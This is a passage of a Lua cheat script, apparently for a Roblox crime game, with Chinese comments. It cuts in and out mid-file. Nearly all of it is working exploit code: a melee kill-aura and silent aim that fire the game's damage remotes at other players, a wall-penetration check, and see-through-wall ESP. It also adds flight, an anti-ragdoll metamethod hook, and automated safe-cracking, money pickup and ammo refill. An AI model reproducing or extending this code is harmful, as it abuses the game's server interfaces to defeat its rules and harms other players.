local function AutoReloadSetup()
    -- 1) 清理当前角色相关的旧连接
    clearReloadConnections()

    -- 2) 如果用户关掉了自动换弹，则同时把常驻重生监听也断开
    if not AutoReload then
        if autoReloadCharConn then
            autoReloadCharConn:Disconnect()
            autoReloadCharConn = nil
        end
        return
    end

    -- 3) 绑定当前角色
    AutoReloadBindChar(LocalPlayer.Character)

    -- 4) 确保常驻重生监听只注册一次
    if not autoReloadCharConn then
        autoReloadCharConn = LocalPlayer.CharacterAdded:Connect(function(c)
            if not AutoReload then return end
            clearReloadConnections()          -- 清掉上一具尸体上的连接
            AutoReloadBindChar(c)              -- 绑定新角色
        end)
    end
end

local function StartMeleeLoop()
    if MA.Loop then return end
    local WCDs = {["Fists"]=.05,["Knuckledusters"]=.05,["Nunchucks"]=0.05,["Shiv"]=.05,["Chainsaw"]=2.5}
    MA.Loop = task.spawn(function()
        while MA.Enabled do
            local char = LocalPlayer.Character
            local tool = char and char:FindFirstChildOfClass("Tool")
            if tool and char:FindFirstChild("HumanoidRootPart") then
                local cd = 0.5
                if WCDs[tool.Name] then cd = WCDs[tool.Name]
                else
                    local cfg = tool:FindFirstChild("Config")
                    if cfg and cfg:IsA("ModuleScript") then
                        pcall(function()
                            local m = require(cfg)
                            if m.Mains and m.Mains.S1 then cd = (m.Mains.S1.SwingWait or 0.2)+(m.Mains.S1.SwingTime or 0.1)+0.05 end
                        end)
                    end
                end
                if tick()-MA.LastHit >= cd then
                    for _, p in ipairs(Players:GetPlayers()) do
                        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                            if not table.find(WhiteList,p.Name) and (not MA.TargetOnly or table.find(TargetList,p.Name)) then
                                local tChar = p.Character
                                local myPos = GetLocalRealPosition()
                                local dist  = (myPos - tChar.HumanoidRootPart.Position).Magnitude
                                local hum   = tChar:FindFirstChildOfClass("Humanoid")
                                if dist <= MA.Distance and hum and hum.Health > (MA.DownCheck and 15 or 0) then
                                    local res = MA.Remote1:InvokeServer("🍞",tick(),tool,"43TRFWX","Normal",tick(),true)
                                    if MA.ShowAnim then pcall(function() char.Humanoid.Animator:LoadAnimation(tool.AnimsFolder.Slash1):Play(0.1,1,1.3) end) end
                                    task.wait(0.2)
                                    local hitPart = MA.TargetPart=="Random" and tChar:FindFirstChild(MA.Parts[math.random(1,#MA.Parts)]) or tChar:FindFirstChild(MA.TargetPart)
                                    if hitPart then
                                        local handle = tool:FindFirstChild("WeaponHandle") or tool:FindFirstChild("Handle") or char:FindFirstChild("Left Arm")
                                        local a = {"🍞",tick(),tool,"2389ZFX34",res,true,handle,hitPart,tChar,myPos,hitPart.Position}
                                        if tool.Name=="Chainsaw" then for i=1,15 do MA.Remote2:FireServer(unpack(a)) end else MA.Remote2:FireServer(unpack(a)) end
                                        MA.LastHit = tick(); break
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait()
        end
        MA.Loop = nil
    end)
end

-- == Auto Functions (Updated) ==

-- == Auto Ammo Refill ==
-- Based on CR-AutoReFill.lua: supported weapons are refilled from the
-- nearest ArmoryDealer / illegal shop when within RANGE.
local ARA_Supported = {
    ["G-17"] = true,
    ["Beretta"] = true,
    ["TEC-9"] = true,
    ["M1911"] = true,
}
local ARA_REFILL_COOLDOWN = 0.32
local ARA_RANGE = 20

local function ARA_GetPlayerPos()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    return hrp and hrp.Position
end

local function ARA_GetNearestShop()
    local pos = ARA_GetPlayerPos()
    if not pos then return nil end

    local shopz = Workspace:FindFirstChild("Map")
        and Workspace.Map:FindFirstChild("Shopz")
    if not shopz then return nil end

    local bestPart, bestType, bestDist = nil, nil, ARA_RANGE

    for _, model in ipairs(shopz:GetChildren()) do
        local part = model:FindFirstChild("MainPart")
        if part and part:IsA("BasePart") then
            local dist = (pos - part.Position).Magnitude
            if dist <= bestDist then
                bestDist = dist
                bestPart = part
                bestType = (model.Name == "ArmoryDealer") and "LegalStore" or "IllegalStore"
            end
        end
    end

    return bestPart and {Part=bestPart, Type=bestType} or nil
end

local function StartAutoAmmoRefill()
    if SC.ARA_Loop then return end
    SC.ARA_Loop = task.spawn(function()
        while SC.ARA_Enabled do
            if os.clock() - SC.ARA_LastRefill >= ARA_REFILL_COOLDOWN then
                local char = LocalPlayer.Character
                local tool = char and char:FindFirstChildOfClass("Tool")
                local events = RepStorage:FindFirstChild("Events")
                local shopEvent = events and events:FindFirstChild("SSHPRMTE1")

                -- Same protocol as CR-AutoReFill.lua, but guarded so a missing
                -- object/remote cannot kill the auto-refill loop.
                if tool and ARA_Supported[tool.Name] and shopEvent then
                    local shop = ARA_GetNearestShop()
                    if shop then
                        local ok = pcall(function()
                            shopEvent:InvokeServer(
                                shop.Type,
                                "Guns",
                                tool.Name,
                                shop.Part,
                                "ResupplyAmmo",
                                true
                            )
                        end)
                        if ok then
                            SC.ARA_LastRefill = os.clock()
                        end
                    end
                end
            end
            task.wait(0.05)
        end
        SC.ARA_Loop = nil
    end)
end

local function StartAutoPickUpMoney()
    if SC.APM_Loop then return end
    SC.APM_Loop = task.spawn(function()
        local event = RepStorage:FindFirstChild("Events") and RepStorage.Events:FindFirstChild("CZDPZUS")
        local filter = Workspace:FindFirstChild("Filter")
        
        while SC.APM_Enabled do
            local didPickup = false
            
            if event and filter then
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                
                if hrp then
                    local bread = filter:FindFirstChild("SpawnedBread")
                    if bread then
                        for _, item in ipairs(bread:GetChildren()) do
                            if (hrp.Position - item.Position).Magnitude < 5 then
                                pcall(function() event:FireServer(item) end)
                                task.wait(1.1)
                                didPickup = true 
                                break
                            end
                        end
                    end
                end
            end
            
            if not didPickup then task.wait(0.1) end
        end
        SC.APM_Loop = nil
    end)
end

-- == Anti-Ragdoll Hook (只需运行一次) ==
local old
old = hookmetamethod(game, "__newindex", function(t, k, v)
    if FLY.Active then
        local lp = Players.LocalPlayer
        local stats = RepStorage:FindFirstChild("CharStats")
        local pStats = stats and stats:FindFirstChild(lp.Name)
        local rt = pStats and pStats:FindFirstChild("RagdollTime")
        
        if rt then
            -- 拦截 RagdollSwitch, RagdollSwitch2, SRagdolled
            if (t == rt:FindFirstChild("RagdollSwitch") or t == rt:FindFirstChild("RagdollSwitch2") or t == rt:FindFirstChild("SRagdolled")) and k == "Value" then
                return old(t, k, false)
            end
            -- 拦截 RagdollTime.Value = 0
            if t == rt and k == "Value" then
                return old(t, k, 0)
            end
            -- 拦截 RagdollTime2 的 MaxValue
            if t == rt:FindFirstChild("RagdollTime2") and k == "MaxValue" then
                return old(t, k, 0)
            end
        end
        -- 拦截 NoRagdoll
        if t == pStats and t:FindFirstChild("NoRagdoll") and k == "Value" then
            return old(t, k, true)
        end
    end
    return old(t, k, v)
end)

local function StartAutoUnlockSafe()
    if SC.AUS_Loop then return end
    SC.AUS_Loop = task.spawn(function()
        while SC.AUS_Enabled do
            local processed = false
            local char = LocalPlayer.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChild("Humanoid")

            if hrp and hum then
                local map        = Workspace:FindFirstChild("Map")
                local bredMakurz = map and map:FindFirstChild("BredMakurz")

                if bredMakurz then
                    local closestSafe, minDist = nil, 12  -- 加大感应距离到 12

                    for _, obj in ipairs(bredMakurz:GetChildren()) do
                        if string.find(string.lower(obj.Name), "safe") then
                            local vals   = obj:FindFirstChild("Values")
                            local broken = vals and vals:FindFirstChild("Broken")
                            if broken and broken.Value == false then
                                local part = obj:IsA("Model") and obj.PrimaryPart
                                          or obj:FindFirstChildWhichIsA("BasePart") or obj
                                if part and part:IsA("BasePart") then
                                    local dist = (hrp.Position - part.Position).Magnitude
                                    if dist <= minDist then
                                        minDist = dist; closestSafe = obj
                                    end
                                end
                            end
                        end
                    end

                    if closestSafe then
                        processed = true

                        -- 确保装备 Lockpick
                        local lockpick = char:FindFirstChild("Lockpick")
                        if not lockpick then
                            local bp = LocalPlayer.Backpack:FindFirstChild("Lockpick")
                            if bp then hum:EquipTool(bp); lockpick = bp; task.wait(0.25) end
                        end

                        if lockpick then
                            local remote = lockpick:FindFirstChild("Remote")
                            if remote then
                                -- 循环获取 token，最多尝试 8 次
                                local token = nil
                                for attempt = 1, 8 do
                                    pcall(function()
                                        token = remote:InvokeServer("S", closestSafe, "s")
                                    end)
                                    if token then break end
                                    task.wait(0.15)
                                end

                                if token then
                                    -- 同时发起 D 和 C（与原版一致）
                                    task.spawn(function()
                                        pcall(function() remote:InvokeServer("D", closestSafe, "s", token) end)
                                    end)
                                    task.spawn(function()
                                        pcall(function() remote:InvokeServer("C") end)
                                    end)
                                    task.wait(0.8)  -- 等待保险箱响应

                                    -- 检查是否成功（Broken 变 true 说明成功）
                                    local vals2   = closestSafe:FindFirstChild("Values")
                                    local broken2 = vals2 and vals2:FindFirstChild("Broken")
                                    if broken2 and not broken2.Value then
                                        -- 还没碎，再补一次 D
                                        pcall(function() remote:InvokeServer("D", closestSafe, "s", token) end)
                                        task.wait(0.5)
                                    end
                                end
                            end
                        end
                        task.wait(0.5)
                    end
                end
            end

            if not processed then task.wait(0.1) end
        end
        SC.AUS_Loop = nil
    end)
end

local function StartSafeChams()
    if SafeChamsLoop then return end
    SafeChamsLoop = task.spawn(function()
        while SafeChamsEnabled do
            local map = Workspace:FindFirstChild("Map")
            local bredMakurz = map and map:FindFirstChild("BredMakurz")
            
            if bredMakurz then
                for _, obj in ipairs(bredMakurz:GetChildren()) do
                    if string.find(string.lower(obj.Name), "safe") then
                        local vals = obj:FindFirstChild("Values")
                        local broken = vals and vals:FindFirstChild("Broken")
                        
                        if broken then
                            local hl = obj:FindFirstChild("SafeHighlight")
                            if broken.Value == false then
                                if not hl then
                                    hl = Instance.new("Highlight")
                                    hl.Name = "SafeHighlight"
                                    hl.FillColor = Color3.fromRGB(0, 255, 0)
                                    hl.FillTransparency = 0.5
                                    hl.OutlineColor = Color3.fromRGB(0, 0, 0)
                                    hl.Parent = obj
                                end
                            else
                                if hl then hl:Destroy() end
                            end
                        end
                    end
                end
            end
            task.wait(1)
        end
        
        -- Cleanup
        local map = Workspace:FindFirstChild("Map")
        local bredMakurz = map and map:FindFirstChild("BredMakurz")
        if bredMakurz then
            for _, obj in ipairs(bredMakurz:GetChildren()) do
                local hl = obj:FindFirstChild("SafeHighlight")
                if hl then hl:Destroy() end
            end
        end
        SafeChamsLoop = nil
    end)
end

local function clearBoxes(p) if BoxESP.Boxes[p] then for _,b in pairs(BoxESP.Boxes[p]) do b:Destroy() end BoxESP.Boxes[p]=nil end end
local function createAdorn(class, part, name, z, color, alpha, size)
    local a = Instance.new(class)
    a.Name=name; a.Adornee=part; a.AlwaysOnTop=true; a.ZIndex=z; a.Color3=color; a.Transparency=alpha; a.Parent=CoreGui
    if class=="BoxHandleAdornment" then a.Size=size else a.Height=size.Y; a.Radius=size.X; a.CFrame=CFrame.Angles(math.rad(90),0,0) end
    return a
end

local function updatePlayerBoxes(p)
    if not p or not espSets.enabled then clearBoxes(p) return end
    if espSets.targetOnly and not table.find(TargetList,p.Name) then clearBoxes(p) return end
    local char = p.Character
    if not char or not char:FindFirstChildOfClass("Humanoid") then return end
    clearBoxes(p); BoxESP.Boxes[p]={}
    for _, pn in pairs(bodyParts) do
        local obj = char:FindFirstChild(pn)
        if obj and obj:IsA("BasePart") then
            if obj.Name=="Head" then
                local s=(obj.Size.X/2)*0.6
                if espSets.outline then table.insert(BoxESP.Boxes[p], createAdorn("CylinderHandleAdornment",obj,"out",-1,espSets.outCol,espSets.outAlpha,Vector2.new(s+espSets.outSize,obj.Size.Z+espSets.outSize))) end
                if espSets.inline  then table.insert(BoxESP.Boxes[p], createAdorn("CylinderHandleAdornment",obj,"in", 1,espSets.inCol, espSets.inAlpha, Vector2.new(s+espSets.inSize, obj.Size.Z+espSets.inSize)))  end
            else
                if espSets.outline then table.insert(BoxESP.Boxes[p], createAdorn("BoxHandleAdornment",obj,"out",-1,espSets.outCol,espSets.outAlpha,obj.Size+Vector3.new(espSets.outSize,espSets.outSize,espSets.outSize))) end
                if espSets.inline  then table.insert(BoxESP.Boxes[p], createAdorn("BoxHandleAdornment",obj,"in", 1,espSets.inCol, espSets.inAlpha, obj.Size+Vector3.new(espSets.inSize, espSets.inSize, espSets.inSize)))  end
            end
        end
    end
end
local function refreshAllESP() for _,p in pairs(Players:GetPlayers()) do updatePlayerBoxes(p) end end

local function GetRandomOffset(r)
    if r<=0.1 then return Vector3.zero end
    return Vector3.new(math.random(-100,100),math.random(-100,100),math.random(-100,100)).Unit*(math.random()*r)
end

local function VisualizeRay(o, t, col)
    if not Debug_Rays then return end
    local d=(t-o).Magnitude; if d<0.1 then return end
    local rp=Instance.new("Part"); rp.Anchored=true; rp.CanCollide=false; rp.Material=Enum.Material.Neon; rp.Color=col
    rp.Size=Vector3.new(0.05,0.05,d); rp.CFrame=CFrame.lookAt(o,t)*CFrame.new(0,0,-d/2); rp.Parent=Workspace; Debris:AddItem(rp,1)
end

local function CheckWallbang(p1, p2)
    local params=RaycastParams.new()
    params.FilterDescendantsInstances={LocalPlayer.Character,Camera}
    params.FilterType=Enum.RaycastFilterType.Exclude
    local d=(p2-p1).Magnitude
    local r=Workspace:Raycast(p1,(p2-p1).Unit*d,params)
    
    -- 修改为：如果没有碰到障碍物，或者障碍物距离目标点小于等于 15 格（允许15格穿墙）
    local ok=not r or (r.Position-p2).Magnitude<=24 
    
    if Debug_Rays then VisualizeRay(p1, ok and p2 or (r and r.Position or p2), ok and Color3.new(0,1,0) or Color3.new(1,0,0)) end
    return ok
end

local function GetTarget()
    local char=LocalPlayer.Character
    local root=char and char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    -- Lock 模式下若目标名单为空，则不打任何人
    if TargetMode=="Lock" and #TargetList==0 then return nil end

    -- 根据装备武器决定最大扫描距离
    local scanDist = ScanDistance
    local curTool = char and char:FindFirstChildOfClass("Tool")
    if curTool then
        local tn = curTool.Name
        if string.find(tn, "Beretta", 1, true) or string.find(tn, "TEC", 1, true) then
            scanDist = 827
        end
    end

    local best,metric=nil,math.huge
    local ml=UIS:GetMouseLocation()
    local sc=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2)
    local myPos=GetLocalRealPosition()
    for _,p in pairs(Players:GetPlayers()) do
        if p~=LocalPlayer and p.Character then
            if not table.find(WhiteList,p.Name) and not (TargetMode=="Lock" and #TargetList>0 and not table.find(TargetList,p.Name)) then
                local pr=p.Character:FindFirstChild("HumanoidRootPart")
                local ph=p.Character:FindFirstChildOfClass("Humanoid")
                if pr and ph and ph.Health>(DownCheck and 15 or 0) and not p.Character:FindFirstChildOfClass("ForceField") then
                    local distance=(myPos-pr.Position).Magnitude
                    if distance > scanDist then
                        continue
                    end
                    if TargetMode=="Near" or TargetMode=="Lock" then
                        local d=(myPos-pr.Position).Magnitude
                        if d<metric then metric=d; best=p end
                    else
                        local sp,on=Camera:WorldToViewportPoint(pr.Position)
                        if on then
                            local d2=((TargetMode=="Mouse" and ml or sc)-Vector2.new(sp.X,sp.Y)).Magnitude
                            if d2<metric then metric=d2; best=p end
                        end
                    end
                end
            end
        end
    end
    return best
end

local function ApplyBodyFF()
    local char=LocalPlayer.Character; if not char then return end
    for _,p in ipairs(char:GetChildren()) do
        if IsBodyPart(p) then p.Material=Enum.Material.ForceField; p.Color=FF_S.Color end
    end
end
local function RestoreBody()
    for p,props in pairs(FF_S.BodyProps) do if p and p.Parent then p.Material=props.Material; p.Color=props.Color end end
    FF_S.BodyProps={}
end
local function ApplyToolFF()
    local char=LocalPlayer.Character
    local tool=char and char:FindFirstChildOfClass("Tool")
    if tool then for _,p in ipairs(tool:GetDescendants()) do if p:IsA("BasePart") then p.Material=Enum.Material.ForceField; p.Color=FF_S.Color end end end
end
local function RestoreTool()
    for p,props in pairs(FF_S.ToolProps) do if p and p.Parent then p.Material=props.Material; p.Color=props.Color end end
    FF_S.ToolProps={}
end

local function GetAllPlayerNames()
    local n={}
    for _,p in pairs(Players:GetPlayers()) do if p~=LocalPlayer then table.insert(n,p.Name) end end
    return n
end

-- =====================================================================
-- == Fly System
-- =====================================================================

-- 飞行动画 track
FLY.AnimObj = Instance.new("Animation")
FLY.AnimObj.AnimationId = FLY.AnimId

local function FlyGetInputDir()
    if not FLY.PM then
        local ok, r = pcall(function()
            return require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
        end)
        if ok then FLY.PM = r end
    end
    if FLY.PM and not FLY.PC then FLY.PC = FLY.PM:GetControls() end
    if FLY.PC then
        local mv = FLY.PC:GetMoveVector()
        local fwd = Camera.CFrame.LookVector
        local rgt = Camera.CFrame.RightVector
        local dir = rgt * mv.X + fwd * -mv.Z
        if dir.Magnitude > 0 then return dir.Unit end
    end
    local dir = Vector3.zero
    if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += Camera.CFrame.LookVector end
    if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= Camera.CFrame.LookVector end
    if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= Camera.CFrame.RightVector end
    if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += Camera.CFrame.RightVector end
    return dir.Magnitude > 0 and dir.Unit or Vector3.zero
end

local function FlyPlayAnim()
    local char = LocalPlayer.Character
    local hum  = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    if FLY.AnimTrack and FLY.AnimTrack.IsPlaying then return end
    local anim = hum:FindFirstChildOfClass("Animator") or hum
    pcall(function()
        FLY.AnimTrack = anim:LoadAnimation(FLY.AnimObj)
        FLY.AnimTrack.Priority = Enum.AnimationPriority.Action4
        FLY.AnimTrack.Looped   = true
        FLY.AnimTrack:Play()
    end)
end

local function FlyStopAnim()
    if FLY.AnimTrack then
        pcall(function() FLY.AnimTrack:Stop(0.3) end)
        FLY.AnimTrack = nil
    end
end

-- 开启飞行（只改状态，不碰 LastSafeCF，彻底消除开启瞬移）
local function FlyOn()
    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    local hum  = char and char:FindFirstChildOfClass("Humanoid")
    if not (hrp and hum) then return end
    FLY.Active = true
    FLY.LastSafeCF = nil
    if FLY.Mode == "Normal Fly" then FlyPlayAnim() else FlyStopAnim() end
    FlyRefreshBtn()
end

-- 关闭飞行：自然跌落，不强制 Running、不清空速度。
-- 关闭后直接回到正常行走/跌落状态，不再出现几秒硬控。
local function FlyOff()
    FLY.Active     = false
    FLY.LastSafeCF = nil
    FLY.CurrentYaw = nil
    FLY.OffTime    = nil
    FlyStopAnim()

    local char = LocalPlayer.Character
    local hum  = char and char:FindFirstChildOfClass("Humanoid")
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")

    if hum then
        hum.PlatformStand = false
        hum.AutoRotate = true
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Freefall)
        end)
    end

    if hrp then
        local v = hrp.AssemblyLinearVelocity
        hrp.AssemblyLinearVelocity = Vector3.new(v.X, math.min(v.Y, -2), v.Z)
        hrp.AssemblyAngularVelocity = Vector3.zero
    end

    FlyRefreshBtn()
end

-- 创建飞行 HUD（可拖动，不扁平）
local function FlyCreateUI()
    if FLY.Gui then FLY.Gui:Destroy(); FLY.Gui = nil; FLY.Btn = nil end

    FLY.Gui = Instance.new("ScreenGui")
    FLY.Gui.Name           = "FlyHUD"
    FLY.Gui.ResetOnSpawn   = false
    FLY.Gui.IgnoreGuiInset = true
    FLY.Gui.DisplayOrder   = 99
    FLY.Gui.Parent         = CoreGui

    local frame = Instance.new("Frame", FLY.Gui)
    frame.Size                   = UDim2.new(0, 140, 0, 78)
    frame.Position               = UDim2.new(1, -160, 1, -110)
    frame.BackgroundColor3       = Color3.fromRGB(16, 16, 16)
    frame.BackgroundTransparency = 0.08
    frame.BorderSizePixel        = 0
    frame.Active                 = true
    frame.Draggable              = true
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 5)

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color        = Color3.fromRGB(55, 55, 55)
    stroke.Thickness    = 1
    stroke.Transparency = 0.2

    -- 顶部标题行
    local title = Instance.new("TextLabel", frame)
    title.Size                 = UDim2.new(1, -16, 0, 20)
    title.Position             = UDim2.new(0, 8, 0, 6)
    title.BackgroundTransparency = 1
    title.Text                 = "FLY  •  " .. tostring(FLY.Mode)
    title.TextColor3           = Color3.fromRGB(160, 160, 160)
    title.TextSize             = 12
    title.Font                 = Enum.Font.GothamMedium
    title.TextXAlignment       = Enum.TextXAlignment.Left

    -- 速度显示
    local speedLabel = Instance.new("TextLabel", frame)
    speedLabel.Size                 = UDim2.new(1, -16, 0, 16)
    speedLabel.Position             = UDim2.new(0, 8, 0, 26)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Text                 = "spd  " .. FLY.Speed
    speedLabel.TextColor3           = Color3.fromRGB(100, 100, 100)
    speedLabel.TextSize             = 10
    speedLabel.Font                 = Enum.Font.Gotham
    speedLabel.TextXAlignment       = Enum.TextXAlignment.Left
    FLY.SpeedLabel = speedLabel

    -- 分隔线
    local div = Instance.new("Frame", frame)
    div.Size                 = UDim2.new(1, -16, 0, 1)
    div.Position             = UDim2.new(0, 8, 0, 46)
    div.BackgroundColor3     = Color3.fromRGB(50, 50, 50)
    div.BorderSizePixel      = 0

    -- 切换按钮
    local btn = Instance.new("TextButton", frame)
    btn.Size                 = UDim2.new(1, -16, 0, 22)
    btn.Position             = UDim2.new(0, 8, 0, 50)
    btn.BackgroundColor3     = Color3.fromRGB(185, 45, 45)
    btn.BorderSizePixel      = 0
    btn.Text                 = "OFF"
    btn.TextColor3           = Color3.fromRGB(240, 240, 240)
    btn.TextSize             = 12
    btn.Font                 = Enum.Font.GothamBold
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
    FLY.Btn = btn

    -- 按钮点击：直接读取并反转 FLY.Active，然后调用对应函数
    btn.MouseButton1Click:Connect(function()
        if FLY.Active then
            FlyOff()
        else
            FlyOn()
        end
    end)

    -- 如果当前已处于激活状态（比如重进菜单），立刻同步按钮颜色
    FlyRefreshBtn()
end

local function FlyDestroyUI()
    if FLY.Gui then FLY.Gui:Destroy(); FLY.Gui = nil; FLY.Btn = nil end
    FLY.SpeedLabel = nil
end

-- 常驻 Heartbeat：事件发射 + 物理 + 关节保护（单一连接，永不断开）
RunService.Heartbeat:Connect(function()
    -- 1. 关节保护（飞行中始终维持关节 Enabled）
    if FLY.Active then
        local char2  = LocalPlayer.Character
        local torso2 = char2 and (char2:FindFirstChild("Torso") or char2:FindFirstChild("UpperTorso"))
        if torso2 then
            for _, jn in ipairs(FLY.Joints) do
                local j = torso2:FindFirstChild(jn)
                if j and j:IsA("Motor6D") and not j.Enabled then j.Enabled = true end
            end
        end
    end

    -- 2. Anti-Ragdoll 每帧强制设置
    if FLY.Active then
        local lp = Players.LocalPlayer
        local stats = RepStorage:FindFirstChild("CharStats")
        local pStats = stats and stats:FindFirstChild(lp.Name)
        local rt = pStats and pStats:FindFirstChild("RagdollTime")
        if rt then
            local s = rt:FindFirstChild("RagdollSwitch")
            local s2 = rt:FindFirstChild("RagdollSwitch2")
            local sr = rt:FindFirstChild("SRagdolled")
            local rt2 = rt:FindFirstChild("RagdollTime2")
            local nr = pStats and pStats:FindFirstChild("NoRagdoll")
            
            if s then s.Value = false end
            if s2 then s2.Value = false end
            if sr then sr.Value = false end
            if rt then rt.Value = 0 end
            if rt2 then rt2.MaxValue = 0 end
            if nr then nr.Value = true end
        end
    end

    -- 3. 事件发射逻辑（加入 CanCollide 检测）
    if FLY.Active then
        -- 检测 TorsoCollider.CanCollide
        local canSend = true
        local char = LocalPlayer.Character
        if char then
            local torso = char:FindFirstChild("Torso")
            local collider = torso and torso:FindFirstChild("TorsoCollider")
            -- 如果找到了 Collider 且 CanCollide 为 true，则停止发送
            if collider and collider.CanCollide == true then
                canSend = false
            end
        end

        if canSend then
            if not FLY.RZDONL then
                pcall(function()
                    FLY.RZDONL = RepStorage.Events:WaitForChild("__RZDONL", 1)
                end)
            end
            local now = os.clock()
            if FLY.RZDONL and now >= FLY.NextSend then
                pcall(function() FLY.RZDONL:FireServer(table.unpack(FLY.EvArgs)) end)
                FLY.NextSend = now + 0.05
            end
        end
    end

    -- 4. 飞行移动逻辑
    if not FLY.Active then return end

    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    local hum  = char and char:FindFirstChildOfClass("Humanoid")
    if not hrp then return end

    local moveDir = FlyGetInputDir()
    if FLY.Mode == "Torso Fly" and hum then
        -- 不进入 Physics/PlatformStand，也不强制 Running，避免僵直和硬控。
        hum.PlatformStand = false
        hum.AutoRotate = true
        local state = hum:GetState()
        if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll then
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Freefall) end)
        end
    end

    -- 有方向才写入飞行速度；无输入时不强制清零，关闭飞行后可自然跌落/行走。
    if moveDir.Magnitude > 0 then
        hrp.AssemblyLinearVelocity = moveDir * FLY.Speed
    end

    -- 5. 速度标签同步
    if FLY.SpeedLabel then
        FLY.SpeedLabel.Text = "spd  " .. FLY.Speed
    end

end)

-- =====================================================================
-- == Silent Aim
-- =====================================================================
do
    local ok1, ok2 = pcall(function()
        SA.VisualizeEvent = RepStorage:WaitForChild("Events2",5):WaitForChild("Visualize",5)
    end), pcall(function()
        SA.DamageEvent = ZF_H
    end)
    if SA.VisualizeEvent then
        SA.VisualizeEvent.Event:Connect(function(_, key, _, Gun, _, StartPos, BulletsPerShot)
            if not SA.Enabled then return end
            if math.random(1,100) > SA.HitChance then return end
            local myTool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if not myTool or Gun ~= myTool then return end
            -- resolve target part
            local partName = SA.TargetPart
            -- find closest target within FOV radius (exact source logic)
            local center
            if SA.FOV_PositionMode == "Mouse" then
                center = UIS:GetMouseLocation()
            else
                center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
            end
            local target, shortestDist = nil, SA.FOV_Radius
            for _, v in ipairs(Players:GetPlayers()) do
                if v == LocalPlayer or not v.Character then continue end
         -- 白名单玩家永不攻击
                if table.find(WhiteList, v.Name) then continue end
                local h = v.Character:FindFirstChildOfClass("Humanoid")
                if not h or h.Health <= 0 then continue end
                if v.Character:FindFirstChildOfClass("ForceField") then continue end
                local part = v.Character:FindFirstChild(partName)
                if not part then continue end
                local pos, onScreen = Camera:WorldToViewportPoint(part.Position)
                if not onScreen then continue end
                local dist = (Vector2.new(pos.X, pos.Y) - center).Magnitude
                if dist < shortestDist then
                    if SA.WallCheck then
                        local ignore = {Camera, LocalPlayer.Character, v.Character}
                        if #Camera:GetPartsObscuringTarget({part.Position}, ignore) > 0 then continue end
                    end
                    target = v; shortestDist = dist
                end
            end
            if not target or not target.Character then return end
            local hitPart = target.Character:FindFirstChild(partName)
            if not hitPart then return end
            local hitPos = hitPart.Position
            local lookVec = (hitPos - StartPos).Unit
            task.wait(0.005)
            for i = 1, #BulletsPerShot do
                SA.DamageEvent:FireServer("🧈", Gun, key, i, hitPart, hitPos, lookVec)
            end
            if Gun:FindFirstChild("Hitmarker") then Gun.Hitmarker:Fire(hitPart) end
        end)
    end
end

-- Random part cycler
RunService.Heartbeat:Connect(function(dt)
    if not SA.Enabled or not SA.IsRandom then return end
    SA.RandomTimer = SA.RandomTimer + dt
    if SA.RandomTimer >= 0.1 then
        SA.RandomTimer = 0
        SA.RandomIdx = (SA.RandomIdx % #SA.RandomParts) + 1
        SA.TargetPart = SA.RandomParts[SA.RandomIdx]
    end
end)

-- SA FOV circle drawing
do
    local FOV_Lines = {}
    local FOV_Rotation = 0

    local function ClearLines()
        for _, line in pairs(FOV_Lines) do if line then line:Remove() end end
        FOV_Lines = {}
    end

    RunService.RenderStepped:Connect(function(dt)
        if not SA.FOV_Visible then ClearLines(); return end
        local center
        if SA.FOV_PositionMode == "Mouse" then
            center = UIS:GetMouseLocation()
        else
            center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
        end
        local sides  = SA.FOV_Sides
        local radius = SA.FOV_Radius
        if SA.FOV_SpinEnabled then
            FOV_Rotation = FOV_Rotation + (SA.FOV_SpinSpeed * dt)
        end
        local base_rad = math.rad(FOV_Rotation)
        if #FOV_Lines ~= sides then
            ClearLines()
            for i = 1, sides do
                local l = Drawing.new("Line")
                l.Visible = true
                FOV_Lines[i] = l
            end
        end
        local verts = {}
        for i = 1, sides do
            local angle = base_rad + math.rad((i-1) * (360/sides))
            verts[i] = center + Vector2.new(math.cos(angle)*radius, math.sin(angle)*radius)
        end
        for i = 1, sides do
            local line = FOV_Lines[i]
            if line then
                line.Visible      = true
                line.From         = verts[i]
                line.To           = verts[i+1] or verts[1]
                line.Thickness    = 1.5
                line.Color        = SA.FOV_Color
                line.Transparency = 1
            end
        end
    end)
end

-- World Visuals enforce loop
RunService.RenderStepped:Connect(function()
    if WV.WorldTimeEnabled then WV_Lit.ClockTime = WV.WorldTime end
    if WV.AmbientEnabled then
        WV_Lit.Ambient = WV.AmbientColor
        WV_Lit.OutdoorAmbient = WV.OutdoorAmbientColor
    end
    if WV.LightingModeEnabled then
        pcall(function() WV_Lit.Technology = Enum.Technology[WV.LightingMode] end)
    end
    
    -- 强制劫持 Atmosphere
    if WV.AtmosphereEnabled then
        local currentAtmo = WV_Lit:FindFirstChildOfClass("Atmosphere")
        if not currentAtmo then
            currentAtmo = WV_Atmo
            currentAtmo.Parent = WV_Lit
        end
